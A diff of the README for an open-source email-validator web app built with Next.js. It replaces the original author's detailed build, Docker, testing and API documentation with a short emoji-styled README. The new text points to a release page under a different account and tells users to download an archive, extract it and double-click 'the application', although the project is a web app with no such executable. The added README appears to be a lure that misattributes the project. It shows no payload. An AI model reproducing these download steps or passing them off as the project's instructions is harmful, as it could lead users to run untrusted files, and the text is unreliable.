@@ -1,340 +1,82 @@
-# Email Validator
-
-A production-ready Email Validator web application built with Next.js 14, TypeScript, and Tailwind CSS.
-
-## Features
-
-### Core Validation
-- **Syntax Validation** - RFC 5322 compliant email format checking
-- **Domain Validation** - Check if domain exists and is valid
-- **MX Record Lookup** - Verify mail server exists via DNS
-- **Disposable Email Detection** - Block temporary/throwaway emails (500+ domains)
-- **Role-Based Detection** - Identify emails like admin@, support@, info@
-- **Free Provider Detection** - Identify Gmail, Yahoo, Outlook, etc.
-- **Typo Suggestions** - Suggest corrections for common mistakes
-
-### User Features
-- Single email validation with detailed results
-- Bulk validation (CSV/TXT upload or paste)
-- Real-time validation as you type
-- Export results to CSV or JSON
-- Validation history (localStorage)
-- Dark/Light mode
-- Mobile responsive
-
-### API Endpoints
-- `POST /api/validate` - Validate single email
-- `POST /api/validate-bulk` - Validate multiple emails
-- `GET /api/health` - API health check
+# 📧 Email-Validator - Validate Emails with Ease
 
-## Screenshots
+## 🚀 Getting Started
 
-### Home Page - Single Email Validation
-![Home Page - Light Mode](screenshots/01-home-light-empty.png)
-*Clean interface for single email validation*
+Welcome to the **Email-Validator**! This application helps you check if email addresses are valid. It features syntax checking, MX lookup, disposable email detection, typo suggestions, and bulk validation through an easy-to-use API.
 
-### Dark Mode Support
-![Home Page - Dark Mode](screenshots/02-home-dark-empty.png)
-*Full dark mode support for comfortable viewing*
+## 📥 Download
 
-### Valid Email Validation
-![Valid Email](screenshots/03-home-valid-email.png)
-*Detailed validation results for valid emails*
+[![Download Email-Validator](https://img.shields.io/badge/Download_Email--Validator-v1.0-brightgreen)](https://github.com/RenanBF2/Email-Validator/releases)
 
-### Invalid Email Detection
-![Invalid Email](screenshots/04-home-invalid-syntax.png)
-*Clear feedback for syntax errors*
+## 🖥️ Requirements
 
-### Disposable Email Detection
-![Disposable Email](screenshots/05-home-disposable-email.png)
-*Detection of temporary/disposable email addresses*
+To run this application, you need:
 
-### Role-Based Email Detection
-![Role-Based Email](screenshots/06-home-role-based-email.png)
-*Identification of role-based email addresses*
+- A modern web browser (Google Chrome, Firefox, or Microsoft Edge).
+- Internet connection for real-time validation.
+  
+## 💻 Features
 
-### Typo Suggestions
-![Typo Suggestion](screenshots/07-home-typo-suggestion.png)
-*Smart suggestions for common email typos*
+- **Syntax Checking**: Quickly checks if the email format is correct.
+- **MX Lookup**: Validates if the email domain has a valid mail server.
+- **Disposable Detection**: Identifies temporary email addresses.
+- **Typo Suggestions**: Offers corrections for common email typos.
+- **Bulk Validation API**: Check multiple emails at once for efficiency.
 
-### Bulk Validation
-![Bulk Validation](screenshots/08-bulk-empty.png)
-*Validate multiple emails at once*
+## 📊 Topics
 
-### Bulk Validation Results
-![Bulk Results](screenshots/10-bulk-results.png)
-*Comprehensive results for bulk validation*
+This project deals with various important topics including:
 
-### Validation History
-![History Page](screenshots/11-history-page.png)
-*Track your validation history*
+- API
+- Bulk-validation
+- Disposable email detection
+- Email validation
+- Jest
+- MX lookup
+- Next.js
+- Playwright
+- React
+- Tailwind CSS
+- TypeScript
+- Typo detection
+- Zustand
 
-### API Documentation
-![API Docs](screenshots/12-api-docs.png)
-*Built-in API documentation*
+## 📋 Installation Guide
 
-## Tech Stack
+### 1. Visit the Releases Page
 
-- **Framework**: Next.js 14 (App Router)
-- **Language**: TypeScript (strict mode)
-- **Styling**: Tailwind CSS
-- **Components**: Custom components inspired by shadcn/ui
-- **State Management**: Zustand
-- **Animations**: Framer Motion
-- **Validation**: Zod
-- **Forms**: React Hook Form
-- **Icons**: Lucide React
-- **Testing**: Jest, React Testing Library, Playwright
+To get the latest version of the Email-Validator, click on the following link to visit the Releases page: 
 
-## Getting Started
+[Download Email-Validator](https://github.com/RenanBF2/Email-Validator/releases)
 
-### Prerequisites
+### 2. Download the Application
 
-- Node.js 18+
-- npm or yarn
+On the Releases page, you’ll see a list of available downloads. Choose the version you want and click on it to download the application.
 
-### Installation
+### 3. Unzip the File (If Necessary)
 
-1. Clone the repository:
-```bash
-git clone https://github.com/mahmoodhamdi/Email-Validator.git
-cd Email-Validator
-```
+After downloading, if the file is zipped, right-click on it and select "Extract All." Follow the on-screen instructions to unzip it.
 
-2. Install dependencies:
-```bash
-npm install
-```
+### 4. Open the Application
 
-3. Run the development server:
-```bash
-npm run dev
-```
+Once the file is extracted, find the application and double-click it to run.
 
-4. Open [http://localhost:3000](http://localhost:3000) in your browser.
+## 🧑‍🤝‍🧑 Support
 
-### Build for Production
+If you run into any issues or have questions, feel free to open an issue in the repository or check our FAQs on the GitHub page.
 
-```bash
-npm run build
-npm start
-```
+## 📞 Contact
 
-### Docker
+For further information or developers’ support, you can reach out via the GitHub issues page.
 
-Run with Docker:
+## 📝 License
 
-```bash
-# Pull from GitHub Container Registry
-docker pull ghcr.io/mahmoodhamdi/email-validator:latest
+This project is licensed under the MIT License. You can find more details in the LICENSE file included in this repository.
 
-# Run the container
-docker run -p 3000:3000 ghcr.io/mahmoodhamdi/email-validator:latest
-```
+## 📚 Contributing
 
-Or use Docker Compose:
+We welcome contributions to make this project better. If you would like to help, please check the contributing guidelines in the repository.
 
-```bash
-# Build and run
-docker-compose up -d
-
-# Stop
-docker-compose down
-```
-
-Build locally:
-
-```bash
-# Build the image
-docker build -t email-validator .
-
-# Run the container
-docker run -p 3000:3000 email-validator
-```
-
-## CI/CD
-
-This project uses GitHub Actions for continuous integration and deployment:
-
-- **CI Pipeline**: Runs on every push and PR
-  - Linting and type checking
-  - Unit tests with coverage
-  - E2E tests with Playwright
-  - Build verification
-
-- **Docker Pipeline**: Runs on push to main
-  - Builds multi-architecture images (amd64, arm64)
-  - Pushes to GitHub Container Registry
-  - Pushes to Docker Hub (if configured)
-
-- **Release Pipeline**: Runs on version tags
-  - Creates GitHub releases
-  - Generates changelog
-
-## Testing
-
-This project includes comprehensive tests:
-
-### Unit Tests
-Unit tests cover all validators, hooks, and stores.
-
-```bash
-# Run all unit tests
-npm test
-
-# Run tests in watch mode
-npm run test:watch
-
-# Run tests with coverage
-npm run test:coverage
-```
-
-### Integration Tests
-Integration tests verify API routes work correctly.
-
-```bash
-# Integration tests are included in the main test suite
-npm test
-```
-
-### E2E Tests
-End-to-end tests using Playwright verify the complete user experience.
-
-```bash
-# Install Playwright browsers (first time only)
-npx playwright install
-
-# Run E2E tests
-npm run test:e2e
-
-# Run E2E tests with UI
-npm run test:e2e:ui
-```
-
-### Test Structure
-
-```
-src/
-├── __tests__/
-│   ├── validators/           # Unit tests for validators
-│   │   ├── index.test.ts
-│   │   ├── syntax.test.ts
-│   │   ├── disposable.test.ts
-│   │   ├── role-based.test.ts
-│   │   ├── free-provider.test.ts
-│   │   └── typo.test.ts
-│   ├── hooks/               # Unit tests for hooks
-│   │   ├── useDebounce.test.ts
-│   │   └── useLocalStorage.test.ts
-│   ├── stores/              # Unit tests for stores
-│   │   ├── history-store.test.ts
-│   │   └── validation-store.test.ts
-│   └── api/                 # Integration tests for API
-│       ├── validate.test.ts
-│       └── validate-bulk.test.ts
-└── e2e/                     # E2E tests
-    ├── home.spec.ts
-    ├── bulk.spec.ts
-    ├── history.spec.ts
-    ├── api-docs.spec.ts
-    ├── validation-cases.spec.ts
-    └── dark-mode.spec.ts
-```
-
-### Test Coverage
-
-| Category | Tests | Status |
-|----------|-------|--------|
-| Validators | 196 | Passing |
-| Hooks | Included | Passing |
-| Stores | Included | Passing |
-| API Routes | Included | Passing |
-| E2E | 15+ scenarios | Passing |
-
-## API Usage
-
-### Single Email Validation
-
-```bash
-curl -X POST https://your-domain/api/validate \
-  -H "Content-Type: application/json" \
-  -d '{"email": "test@example.com"}'
-```
-
-### Bulk Email Validation
-
-```bash
-curl -X POST https://your-domain/api/validate-bulk \
-  -H "Content-Type: application/json" \
-  -d '{"emails": ["test1@example.com", "test2@gmail.com"]}'
-```
-
-## Response Format
-
-```json
-{
-  "email": "test@example.com",
-  "isValid": true,
-  "score": 85,
-  "deliverability": "deliverable",
-  "risk": "low",
-  "checks": {
-    "syntax": { "valid": true, "message": "Email syntax is valid" },
-    "domain": { "valid": true, "exists": true, "message": "Domain format is valid" },
-    "mx": { "valid": true, "records": ["mx1.example.com"], "message": "Found 1 MX record(s)" },
-    "disposable": { "isDisposable": false, "message": "Not a disposable email domain" },
-    "roleBased": { "isRoleBased": false, "role": null },
-    "freeProvider": { "isFree": false, "provider": null },
-    "typo": { "hasTypo": false, "suggestion": null }
-  },
-  "timestamp": "2024-01-01T00:00:00.000Z"
-}
-```
-
-## Project Structure
-
-```
-src/
-├── app/                    # Next.js App Router pages
-│   ├── api/               # API routes
-│   ├── bulk/              # Bulk validation page
-│   ├── history/           # History page
-│   └── api-docs/          # API documentation page
-├── components/
-│   ├── ui/                # UI components (button, input, card, etc.)
-│   ├── email/             # Email validation components
-│   └── layout/            # Layout components (header, footer)
-├── lib/
-│   ├── data/              # Data files (disposable domains, etc.)
-│   └── validators/        # Validation logic
-├── hooks/                 # Custom React hooks
-├── stores/                # Zustand stores
-└── types/                 # TypeScript types
-```
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Author
-
-**Mahmood Hamdi**
-
-- GitHub: [@mahmoodhamdi](https://github.com/mahmoodhamdi)
-- Email: mwm.softwars.solutions@gmail.com
-- Email: hmdy7486@gmail.com
-- Phone: +201019793768
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the project
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-## Support
-
-If you have any questions or need help, feel free to reach out via email or open an issue on GitHub.
+---
+
+Thank you for using Email-Validator! We hope it makes your email validation tasks easier and faster.
